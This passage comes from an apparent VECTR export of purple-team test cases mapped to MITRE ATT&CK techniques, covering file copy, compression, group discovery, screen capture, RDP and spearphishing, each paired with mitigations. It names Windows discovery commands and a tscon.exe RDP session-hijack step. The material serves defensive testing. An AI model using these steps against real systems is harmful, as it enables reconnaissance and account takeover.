SRP)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--7af27c8a-6b6f-4971-85aa-b7edc323fced","vectrId":"7af27c8a-6b6f-4971-85aa-b7edc323fced","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"69a00d73-ea90-401c-8ef0-9fcd1785d0b4","templateId":"7af27c8a-6b6f-4971-85aa-b7edc323fced","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Remote File Copy","variant":"Magic Hound - Remote File Copy - Pupy","objective":"Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Files may be copied from an external adversary-controlled system through the Command and Control channel to bring tools into the victim network or through alternate protocols with another tool such as [FTP](https://attack.mitre.org/software/S0095). Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.\n\nAdversaries may also copy files laterally between internal victim systems to support Lateral Movement with remote Execution using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with [Windows Admin Shares](https://attack.mitre.org/techniques/T1077) or [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1076).\n---\n[Pupy](https://attack.mitre.org/software/S0192) is an open source, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool. (Citation: GitHub Pupy) It is written in Python and can be generated as a payload in several different ways (Windows exe, Python file, PowerShell oneliner/file, Linux elf, APK, Rubber Ducky, etc.). (Citation: GitHub Pupy) [Pupy](https://attack.mitre.org/software/S0192) is publicly available on GitHub. (Citation: GitHub Pupy)","command":"[Magic Hound](https://attack.mitre.org/groups/G0059) has downloaded additional code and files from servers onto victims.Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.\n---\n[Pupy](https://attack.mitre.org/software/S0192) can upload and download to/from a victim machine.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["5a7984d4-d134-4fbd-ab45-5dfa73bfd16b"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add","relationship--47f521b8-37e4-489d-b6eb-25f35de80aae","relationship--1ddae833-8280-4afa-b2b0-e250e22104fe","course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c","relationship--ab637576-5bf9-423f-b5e8-6d1ac26bbb5c","course-of-action--cdecc44a-1dbf-4c1f-881c-f21e3f47272a","tool--cb69b20d-56d0-41ab-8440-4a4b251614d4","relationship--151dd9ac-7e33-4580-a4a4-09f71fa73f51","intrusion-set--f9d6633a-55e6-4adc-9263-6ae080421a13"]}],"references":["Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016. https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf","Lee, B. and Falcone, R. (2017, February 15). Magic Hound Campaign Attacks Saudi Targets. Retrieved December 27, 2017. https://researchcenter.paloaltonetworks.com/2017/02/unit42-magic-hound-campaign-attacks-saudi-targets/","Nicolas Verdier. (n.d.). Retrieved January 29, 2018. https://github.com/n1nj4sec/pupy"],"mitreId":"T1105"},"blueTeam":{"successfulDetectionBehaviors":["Use intrusion detection signatures to block traffic at network boundaries.","Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. (Citation: University of Birmingham C2)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--7b22dfac-430b-4053-9aa2-81b72098eb75","vectrId":"7b22dfac-430b-4053-9aa2-81b72098eb75","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"bb51fb2c-dc2f-40dc-9e1b-f3f33f7d5675","templateId":"7b22dfac-430b-4053-9aa2-81b72098eb75","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Data Compressed","variant":"CopyKittens - Data Compressed - Empire","objective":"An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network. The compression is done separately from the exfiltration channel and is performed using a custom program or algorithm, or a more common compression library or utility such as 7zip, RAR, ZIP, or zlib.\n---\n[Empire](https://attack.mitre.org/software/S0363) is an open source, cross-platform remote administration and post-exploitation framework that is publicly available on GitHub. While the tool itself is primarily written in Python, the post-exploitation agents are written in pure [PowerShell](https://attack.mitre.org/techniques/T1086) for Windows and Python for Linux/macOS. [Empire](https://attack.mitre.org/software/S0363) was one of five tools singled out by a joint report on public hacking tools being widely used by adversaries.(Citation: NCSC Joint Report Public Tools)(Citation: Github PowerShell Empire)(Citation: GitHub ATTACK Empire)\n\n","command":"[CopyKittens](https://attack.mitre.org/groups/G0052) uses ZPP, a .NET console program, to compress files with ZIP.Network intrusion prevention or data loss prevention tools may be set to block specific file types from leaving the network over unencrypted channels. An adversary may move to an encrypted channel or use other mechanisms of encapsulating the traffic in these situations.\n---\n[Empire](https://attack.mitre.org/software/S0363) can ZIP directories on the target system.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["76ca4ddf-5174-57a7-2842-70d5af62a25c"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--b9f5dbe2-4c55-4fc5-af2e-d42c1d182ec4","relationship--2e82ef21-9fb2-421e-bd96-73599089b448","relationship--36a41a30-61ce-4c55-9916-0a572dfe6d36","course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c","relationship--ea46cbd0-7134-4ede-a117-47380ddd9b5c","course-of-action--28adf6fd-ab6c-4553-9aa7-cef18a191f33","tool--3433a9e8-1c47-4320-b9bf-ed449061d1c3","relationship--32fc949c-2127-425b-9480-6d07ead49982","intrusion-set--dcd81c6e-ebf7-4a16-93e0-9a97fa49c88a"]}],"references":["(Citation: Github PowerShell Empire)","ClearSky Cyber Security and Trend Micro. (2017, July). Operation Wilted Tulip: Exposing a cyber espionage apparatus. Retrieved August 21, 2017. http://www.clearskysec.com/wp-content/uploads/2017/07/Operation_Wilted_Tulip.pdf","Schroeder, W., Warner, J., Nelson, M. (n.d.). Github PowerShellEmpire. Retrieved April 28, 2016. https://github.com/PowerShellEmpire/Empire","Stepanic, D. (2018, September 2). attck_empire: Generate ATT&CK Navigator layer file from PowerShell Empire agent logs. Retrieved March 11, 2019. https://github.com/dstepanic/attck_empire","The Australian Cyber Security Centre (ACSC), the Canadian Centre for Cyber Security (CCCS), the New Zealand National Cyber Security Centre (NZ NCSC), CERT New Zealand, the UK National Cyber Security Centre (UK NCSC) and the US National Cybersecurity and Communications Integration Center (NCCIC). (2018, October 11). Joint report on publicly available hacking tools. Retrieved March 11, 2019. https://s3.eu-west-1.amazonaws.com/ncsc-content/files/Joint%20report%20on%20publicly%20available%20hacking%20tools%20%28NCSC%29.pdf","Wikipedia. (2016, March 31). List of file signatures. Retrieved April 22, 2016. https://en.wikipedia.org/wiki/List_of_file_signatures"],"mitreId":"T1002"},"blueTeam":{"successfulDetectionBehaviors":["Use intrusion detection signatures to block traffic at network boundaries.","Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to compress files, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)\n\nIf network intrusion prevention or data loss prevention tools are set to block specific file types from leaving the network over unencrypted channels, then an adversary may move to an encrypted channel."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--7c84d591-e5b9-4782-91ad-1c0277b59dc7","vectrId":"7c84d591-e5b9-4782-91ad-1c0277b59dc7","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","templateId":"7c84d591-e5b9-4782-91ad-1c0277b59dc7","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Permission Groups Discovery","variant":"OilRig - Permission Groups Discovery - Net","objective":"Adversaries may attempt to find local system or domain-level groups and permissions settings. \n\n### Windows\n\nExamples of commands that can list groups are <code>net group /domain</code> and <code>net localgroup</code> using the [Net](https://attack.mitre.org/software/S0039) utility.\n\n### Mac\n\nOn Mac, this same thing can be accomplished with the <code>dscacheutil -q group</code> for the domain, or <code>dscl . -list /Groups</code> for local groups.\n\n### Linux\n\nOn Linux, local groups can be enumerated with the <code>groups</code> command and domain groups via the <code>ldapsearch</code> command.\n\n### Office 365 and Azure AD\n\nWith authenticated access there are several tools that can be used to find permissions groups. The <code>Get-MsolRole</code> PowerShell cmdlet can be used to obtain roles and permissions groups for Exchange and Office 365 accounts.(Citation: Microsoft msrole)(Citation: GitHub Raindance)\n\nAzure CLI (AZ CLI) also provides an interface to obtain permissions groups with authenticated access to a domain. The command <code>az ad user get-member-groups</code> will list groups associated to a user account.(Citation: Microsoft AZ CLI)(Citation: Black Hills Red Teaming MS AD Azure, 2018)\n---\nThe [Net](https://attack.mitre.org/software/S0039) utility is a component of the Windows operating system. It is used in command-line operations for control of users, groups, services, and network connections. (Citation: Microsoft Net Utility)\n\n[Net](https://attack.mitre.org/software/S0039) has a great deal of functionality, (Citation: Savill 1999) much of which is useful for an adversary, such as gathering system and network information for Discovery, moving laterally through [Windows Admin Shares](https://attack.mitre.org/techniques/T1077) using <code>net use</code> commands, and interacting with services. The net1.exe utility is executed for certain functionality when net.exe is run and can be used directly in commands such as <code>net1 user</code>.","command":"[OilRig](https://attack.mitre.org/groups/G0049) has used <code>net group /domain</code>, <code>net localgroup administrators</code>, <code>net group “domain admins” /domain</code>, and <code>net group “Exchange Trusted Subsystem” /domain</code> to find group permission settings on a victim.Commands such as <code>net group</code> and <code>net localgroup</code> can be used in [Net](https://attack.mitre.org/software/S0039) to gather information about and manipulate groups.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["b908f5c3-a12f-4e3f-b46e-6aa8a0b1aee3"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--15dbf668-795c-41e6-8219-f0447c0e64ce","relationship--d39e3775-9221-4020-b826-edc111e36c7c","relationship--4d6def4b-69cf-4dca-848b-53de73536ad6","course-of-action--dd9a85ad-6a92-4986-a215-b01d0ce7b987","tool--03342581-f790-4f03-ba41-e82e67392e23","relationship--75f7d0e0-b1e9-4289-8895-d8a262930523","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["Falcone, R. and Lee, B.. (2016, May 26). The OilRig Campaign: Attacks on Saudi Arabian Organizations Deliver Helminth Backdoor. Retrieved May 3, 2017. http://researchcenter.paloaltonetworks.com/2016/05/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/","Felch, M.. (2018, August 31). Red Teaming Microsoft Part 1 Active Directory Leaks via Azure. Retrieved October 6, 2019. https://www.blackhillsinfosec.com/red-teaming-microsoft-part-1-active-directory-leaks-via-azure/","Microsoft. (2006, October 18). Net.exe Utility. Retrieved September 22, 2015. https://msdn.microsoft.com/en-us/library/aa939914","Microsoft. (n.d.). Get-MsolRole. Retrieved October 6, 2019. https://docs.microsoft.com/en-us/powershell/module/msonline/get-msolrole?view=azureadps-1.0","Microsoft. (n.d.). az ad user. Retrieved October 6, 2019. https://docs.microsoft.com/en-us/cli/azure/ad/user?view=azure-cli-latest","Savill, J. (1999, March 4). Net.exe reference. Retrieved September 22, 2015. http://windowsitpro.com/windows/netexe-reference","Stringer, M.. (2018, November 21). RainDance. Retrieved October 6, 2019. https://github.com/True-Demon/raindance"],"mitreId":"T1069"},"blueTeam":{"successfulDetectionBehaviors":["Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about groups and permissions, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--7ea0c6a7-ad49-4158-8f83-abe043fcf079","vectrId":"7ea0c6a7-ad49-4158-8f83-abe043fcf079","name":null,"offset":0,"createTime":1.574779748235E12,"updateTime":1.574779748235E12,"phaseId":"24291ae1-2110-4f4c-8b0d-7b8c8676ed5d","templateId":"7ea0c6a7-ad49-4158-8f83-abe043fcf079","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Screen Capture","variant":"MuddyWater - Screen Capture","objective":"Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations.\n\n### Mac\n\nOn OSX, the native command <code>screencapture</code> is used to capture screenshots.\n\n### Linux\n\nOn Linux, there is the native command <code>xwd</code>. (Citation: Antiquated Mac Malware)","command":"[MuddyWater](https://attack.mitre.org/groups/G0069) has used malware that can capture screenshots of the victim’s machine.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--0259baeb-9f63-4c69-bf10-eb038c390688","relationship--6f6b8a04-916e-4f33-8837-ff48e00e771b","relationship--366214ea-29b0-458a-a852-7a76420783d2","course-of-action--51b37302-b844-4c08-ac98-ae6955ed1f55","intrusion-set--269e8108-68c6-4f99-b911-14b2e765dec2"]}],"references":["Kaspersky Lab's Global Research & Analysis Team. (2018, October 10). MuddyWater expands operations. Retrieved November 2, 2018. https://securelist.com/muddywater/88059/","Thomas Reed. (2017, January 18). New Mac backdoor using antiquated code. Retrieved July 5, 2017. https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/"],"mitreId":"T1113"},"blueTeam":{"successfulDetectionBehaviors":["Blocking software based on screen capture functionality may be difficult, and there may be legitimate software that performs those actions. Instead, identify potentially malicious software that may have functionality to acquire screen captures, and audit and/or block it by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--84ccc036-4973-4307-9eea-e55ba6672ce0","vectrId":"84ccc036-4973-4307-9eea-e55ba6672ce0","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"866d6b69-3f03-4c88-bf51-679a0e4cab74","templateId":"84ccc036-4973-4307-9eea-e55ba6672ce0","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Remote Desktop Protocol","variant":"OilRig - Remote Desktop Protocol","objective":"Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). (Citation: TechNet Remote Desktop Services) There are other implementations and third-party tools that provide graphical access [Remote Services](https://attack.mitre.org/techniques/T1021) similar to RDS.\n\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1015) technique for Persistence. (Citation: Alperovitch Malware)\n\nAdversaries may also perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session and prompted with a question. With System permissions and using Terminal Services Console, <code>c:\\windows\\system32\\tscon.exe [session number to be stolen]</code>, an adversary can hijack a session without the need for credentials or prompts to the user. (Citation: RDP Hijacking Korznikov) This can be done remotely or locally and with active or disconnected sessions. (Citation: RDP Hijacking Medium) It can also lead to [Remote System Discovery](https://attack.mitre.org/techniques/T1018) and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in RedSnarf. (Citation: Kali Redsnarf)","command":"[OilRig](https://attack.mitre.org/groups/G0049) has used Remote Desktop Protocol for lateral movement. The group has also used tunneling tools to tunnel RDP into the environment.Limit remote user permissions if remote access is necessary.\n---\nConsider removing the local Administrators group from the list of groups allowed to log in through RDP.\n---\nUse multi-factor authentication for remote logins.\n---\nDisable the RDP service if it is unnecessary.\n---\nChange GPOs to define shorter timeouts sessions and maximum amount of time any single session can be active. Change GPOs to specify the maximum amount of time that a disconnected session stays active on the RD session host server.\n---\nAudit the Remote Desktop Users group membership regularly. Remove unnecessary accounts and groups from Remote Desktop Users groups\n---\nDo not leave RDP accessible from the internet. Enable firewall rules to block RDP traffic between network security zones within a network.\n---\nUse remote desktop gateways.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--51dea151-0898-4a45-967c-3ebee0420484","relationship--27ead6bc-2bba-49d3-bcfe-667c7654a6fc","relationship--1d0bbeb7-5477-4321-81cd-ef66607d7972","course-of-action--53b3b027-bed3-480c-9101-1247047d0fe6","relationship--bea04550-f39b-4840-82f2-5da61457f696","course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317","relationship--48925883-c396-49a2-8b1b-2d7220959e2c","course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f","relationship--3eb59d14-a07f-493a-8bee-5877c6c1d478","course-of-action--b045d015-6bed-4490-bd38-56b41ece59a0","relationship--d02e0a35-ab09-49a9-958f-d71fbb1e3e6f","course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31","relationship--65e07f9e-91cd-4b91-8707-83b4ffdb29bd","course-of-action--2f316f6c-ae42-44fe-adf8-150989e0f6d3","relationship--0a5b4837-54e4-46e0-80e9-03c39919aec4","course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8","relationship--bff585a5-6a32-4361-a72c-dfb1f6e6fe3d","course-of-action--86598de0-b347-4928-9eb0-0acbfc21908c","relationship--227f3705-ab28-4b5f-87d7-12bcf14c47f7","course-of-action--1dcaeb21-9348-42ea-950a-f842aaf1ae1f","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["Alperovitch, D. (2014, October 31). Malware-Free Intrusions. Retrieved November 4, 2014. http://blog.crowdstrike.com/adversary-tricks-crowdstrike-treats/","Beaumont, K. (2017, March 19). RDP hijacking — how to hijack RDS and RemoteApp sessions transparently to move through an organisation. Retrieved December 11, 2017. https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6","Berkeley Security, University of California. (n.d.). Securing Remote Desktop for System Administrators. Retrieved November 4, 2014. https://security.berkeley.edu/node/94","Davis, S. and Caban, D. (2017, December 19). APT34 - New Targeted Attack in the Middle East. Retrieved December 20, 2017. https://www.brighttalk.com/webcast/10703/296317/apt34-new-targeted-attack-in-the-middle-east","Korznikov, A. (2017, March 17). Passwordless RDP Session Hijacking Feature All Windows versions. Retrieved December 11, 2017. http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html","Microsoft. (n.d.). Configure Timeout and Reconnection Settings for Remote Desktop Services Sessions. Retrieved December 11, 2017. https://technet.microsoft.com/en-us/library/cc754272(v=ws.11).aspx","Microsoft. (n.d.). Remote Desktop Services. Retrieved June 1, 2016. https://technet.microsoft.com/en-us/windowsserver/ee236407.aspx","NCC Group PLC. (2016, November 1). Kali Redsnarf. Retrieved December 11, 2017. https://github.com/nccgroup/redsnarf","Unit 42. (2017, December 15). Unit 42 Playbook Viewer. Retrieved December 20, 2017. https://pan-unit42.github.io/playbook_viewer/"],"mitreId":"T1076"},"blueTeam":{"successfulDetectionBehaviors":["Disable the RDP service if it is unnecessary, remove unnecessary accounts and groups from Remote Desktop Users groups, and enable firewall rules to block RDP traffic between network security zones. Audit the Remote Desktop Users group membership regularly. Remove the local Administrators group from the list of groups allowed to log in through RDP. Limit remote user permissions if remote access is necessary. Use remote desktop gateways and multifactor authentication for remote logins. (Citation: Berkley Secure) Do not leave RDP accessible from the internet. Change GPOs to define shorter timeouts sessions and maximum amount of time any single session can be active. Change GPOs to specify the maximum amount of time that a disconnected session stays active on the RD session host server. (Citation: Windows RDP Sessions)","Manage the creation, modification, use, and permissions associated to user accounts.","Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.","Use two or more pieces of evidence to authenticate to a system; such as username and password in addition to a token from a physical smart card or token generator.","Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.","Make configuration changes related to the operating system or a common feature of the operating system that result in system hardening against techniques.","Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses.","Architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a DMZ to contain any internet-facing services that should not be exposed from the internal network.","Prevent access to file shares, remote access to systems, unnecessary services. Mechanisms to limit access may include use of network concentrators, RDP gateways, etc."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--865bdbb6-01af-4b41-81d1-0ececa73d12d","vectrId":"865bdbb6-01af-4b41-81d1-0ececa73d12d","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"769c1759-3db5-486d-918a-67fbadee4787","templateId":"865bdbb6-01af-4b41-81d1-0ececa73d12d","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Spearphishing Link","variant":"APT39 - Spearphishing Link","objective":"Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)","command":"[APT39](https://attack.mitre.org/groups/G0087) leveraged spearphishing emails with malicious links to initially compromise victims.Users can be trained to identify social engineering techniques and spearphishing emails with malicious links.\n---\nDetermine if certain websites that can be used for spearphishing are necessary for business operations and consider blocking access if activity cannot be monitored well or if it poses a significant risk.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--20138b9d-1aac-4a26-8654-a36b6bbf2bba","relationship--f5cd03ce-93e0-4458-ba90-ca3926bb41b9","relationship--1c04a87c-6a12-4aaa-8ead-30cd22d7850d","course-of-action--ad7f983d-d5a8-4fce-a38c-b68eda61bf4e","relationship--93669ebc-ea8d-4f76-94c8-4f8d1679b123","course-of-action--2a4f6c11-a4a7-4cb9-b0ef-6ae1bb3a718a","relationship--541884aa-9ee9-4241-b556-c7885c12102b","course-of-action--21da4fd4-27ad-4e9c-b93d-0b9b14d02c96","intrusion-set--44e43fad-ffcb-4210-abcf-eaaed9735f80"]}],"references":["Hacquebord, F.. (2017, April 25). Pawn Storm Abuses Open Authentication in Advanced Social Engineering Attacks. Retrieved October 4, 2019. https://blog.trendmicro.com/trendlabs-security-intelligence/pawn-storm-abuses-open-authentication-advanced-social-engineering-attacks","Hawley et al. (2019, January 29). APT39: An Iranian Cyber Espionage Group Focused on Personal Information. Retrieved February 19, 2019. https://www.fireeye.com/blog/threat-research/2019/01/apt39-iranian-cyber-espionage-group-focused-on-personal-information.html"],"mitreId":"T1192"},"blueTeam":{"successfulDetectionBehaviors":["Because this technique involves user interaction on the endpoint, it's difficult to fully mitigate. However, there are potential mitigations. Users can be trained to identify social engineering techniques and spearphishing emails with malicious links. Determine if certain websites that can be used for spearphishing are necessary for business operations and consider blocking access if activity cannot be monitored well or if it poses a significant risk. Other mitigations can take place as [User Execution](https://attack.mitre.org/techniques/T1204) occurs.","Train users to to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.","Restrict use of certain websites, block downloads/attachments, block Javascript, restrict browser extensions, 